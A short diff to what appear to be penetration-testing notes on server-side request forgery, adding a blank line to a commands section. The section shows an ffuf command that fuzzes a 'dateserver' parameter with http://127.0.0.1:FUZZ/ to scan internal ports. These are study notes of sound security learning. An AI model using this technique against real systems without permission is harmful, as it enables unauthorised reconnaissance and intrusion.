@@ -29,6 +29,7 @@ Exploiting blind SSRF vulnerabilities is generally severely limited compared to 
 
 ## COMMANDS
 > seq 1 10000 > ports.txt list of ports
+
 > ffuf -w ./ports.txt -u http://target_ip/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to" fuzzing ports
 
 
